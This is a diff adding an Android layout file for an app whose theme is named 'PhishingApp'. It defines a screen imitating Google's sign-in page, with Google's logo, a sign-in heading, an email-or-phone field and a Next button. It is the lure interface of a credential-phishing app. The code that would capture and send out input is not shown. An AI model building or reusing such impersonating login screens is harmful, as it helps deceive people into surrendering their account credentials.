@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/white"
+    android:fitsSystemWindows="true"
+    android:orientation="vertical"
+    android:gravity="end"
+    android:padding="26dp"
+    android:theme="@style/ThemeOverlay.PhishingApp.FullscreenContainer"
+    tools:context=".GoogleLoginEmailActivity">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:fitsSystemWindows="true"
+        android:layout_marginTop="80dp"
+        android:gravity="center">
+
+        <ImageView
+            android:layout_width="120dp"
+            android:layout_height="80dp"
+            android:importantForAccessibility="no"
+            android:src="@drawable/google_logo" />
+
+        <com.google.android.material.textview.MaterialTextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="@string/sign_in"
+            android:textAppearance="?attr/textAppearanceHeadline5"/>
+
+        <com.google.android.material.textview.MaterialTextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="@string/sign_in_description"
+            android:gravity="center"
+            android:textColor="@color/black"
+            android:layout_marginHorizontal="44dp"
+            android:textSize="12sp"
+            android:layout_marginTop="20dp"
+            android:lineSpacingExtra="4dp"/>
+
+        <com.google.android.material.textview.MaterialTextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content" />
+
+        <com.google.android.material.textfield.TextInputLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
+            app:boxStrokeColor="@color/blue"
+            app:hintTextColor="@color/blue"
+            android:hint="@string/email_or_phone"
+            app:boxCornerRadiusTopStart="8dp"
+            app:boxCornerRadiusTopEnd="8dp"
+            app:boxCornerRadiusBottomStart="8dp"
+            app:boxCornerRadiusBottomEnd="8dp"
+            app:boxStrokeErrorColor="@android:color/holo_red_dark"
+            app:boxStrokeWidth="0.5dp">
+
+            <com.google.android.material.textfield.TextInputEditText
+                android:layout_width="match_parent"
+                android:layout_height="match_parent"
+                android:textCursorDrawable="@null"
+                android:inputType="textEmailAddress"
+                android:maxLines="1"
+                android:id="@+id/emailOrPhone"
+                android:textColor="@color/black"/>
+        </com.google.android.material.textfield.TextInputLayout>
+    </LinearLayout>
+
+    <com.google.android.material.button.MaterialButton
+        android:layout_width="70dp"
+        android:layout_height="34dp"
+        android:insetTop="0dp"
+        android:insetBottom="0dp"
+        app:cornerRadius="6dp"
+        android:backgroundTint="@color/blue"
+        android:text="@string/next"
+        android:layout_marginTop="54dp"
+        android:id="@+id/next"
+        android:textAppearance="?attr/textAppearanceCaption"
+        android:textAllCaps="false" />
+
+</LinearLayout>
